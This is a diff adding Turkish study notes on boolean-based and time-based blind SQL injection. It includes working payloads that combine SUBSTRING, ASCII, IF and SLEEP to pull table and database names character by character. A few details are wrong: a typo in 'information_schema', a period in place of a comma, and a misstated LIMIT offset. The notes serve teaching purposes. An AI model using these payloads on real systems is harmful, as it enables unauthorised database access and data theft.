@@ -133,6 +133,75 @@
      ```
   - Burada rand() fonksiyonunu kullanmamızın sebebi hata ürettirip kendi yazdığımız subquery'nin sonucunu ekrana basmak.
 
+  ## Boolean-Based SQLi
+
+  ## Referans Olarak Alacağımız Kod:
+   
+   ```
+   if result.size() > 0:
+        print("Haber Var")
+   else:
+        print("Haber Yok")
+   ```
+
+  - Bu koddan çıkaracağımız anlam:
+      - Select sorgusu ekrana basılmıyor.
+      - Eğer query çalıştıysa "Haber Var" yazacak ekranda,çalışmadıysa ise "Haber Yok" yazacak.
+      - True,false oynamamız gerekiyor.
+
+
+  - Burada da kullanabileceğimiz SUBSTRING() adlı bir fonksiyonumuz var.Bu fonksiyona bir string değer verdiğiniz zaman o string değerinin içinden karakter çıkarttırabiliyorsunuz.Örnek kullanım:
+
+    ```
+    SUBSTRING('MEHMET', 2, 1)
+    Sonuç E döner çünkü buradaki 2 hangi karakterden başlayacağımızı belirtir.1 ise kaç tane getireceğini belirler.
+    ```
+  - SUBSTRING() fonksiyonunun içine bir subselect ekleyebiliriz:
+    
+    ```
+    SUBSTRING((SELECT table_name FROM ınformation_schema.tables WHERE table_schema=database() LIMIT 1,1),1,1)=a
+    LIMIT 1,1 kullanmamızın sebebi ilk tablonun ilk harfini bulmak.
+    =a kısmını değiştirerek "Haber Var" yazısını alana kadar devam etmemiz lazım.
+    ```
+  - Bu süreci hızlandırmak için ASCII() fonksiyonunu kullanabiliriz.Bu fonksiyon bir karakterin ASCII sayı karşılığını döndürür.Binary Search tekniği olarak da adlandırılır.Büyüktür küçüktür oynamak gibi de düşünebilirsiniz.
+
+  - Örnek payload:
+
+    ```ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 1, 1)) > 104
+    Eğer sonuç 104'den büyükse ASCII tablosundaki 104'den büyük olan numaraların aritmetik ortalamasını alıp aynı işlemi daha az HTTP request ile çözmüş oluyoruz.
+    ```
+ 
+  ## Time-Based SQLi
+
+  ## Time-Based SQLi Nedir?
   
+  - Time-Based SQL Injection, saldırganın veritabanının yanıt süresini kasıtlı olarak geciktirerek sorgunun doğru (TRUE) ya da yanlış (FALSE) olup olmadığını anlamaya çalıştığı bir blind (kör) SQL injection türüdür.
+
+  - Klasik SQL injection saldırılarından farklı olarak, bu yöntemde veriler doğrudan elde edilmez. Bunun yerine, veritabanında bilinçli olarak gecikmeye neden olan SQL fonksiyonları tetiklenir.
+
+  - Saldırgan, uygulamanın yanıt süresini ölçerek belirli bir koşulun doğru mu yoksa yanlış mı olduğunu anlayabilir. Bu sayede, ekranda herhangi bir çıktı veya hata mesajı olmadan bile sistemden bilgi sızdırmak mümkün olur.
+
+  ## Nasıl Tespit Edilir?
+
+  - Diyelim ki arkada SELECT * FROM haberler WHERE id = 1 şeklinde bir query çalışıyor.
+  - ?id=1 AND SLEEP(5) yazınca database 5 saniye uyursa SQL injection var.
+  - IF() fonksiyonunu kullanarak true ve false arasındaki zaman farklarını anlayabiliriz.Mesela:
+    
+    ```
+    ?id=1 AND IF(1=1,SLEEP(5),0) #eğer 1 1'e eşitse 5 saniye bekle
+    ?id=1 AND IF(1=2,SLEEP(5).0) #1 2'ye eşit olmadığı için 5 saniye uyumayacak
+    ```
+  
+  - Eğer yukarıda da kullandığımız tekniklerle birleştirirsek:
+   
+   ```
+   IF(ASCII(SUBSTRING(database(),1,1)) > 100, SLEEP(5), 0)
+   Bu şekilde database'in adının ilk karakterini öğrenmeye çalışabiliriz.
+   ```
+  
+    
+
+
+      
     
   
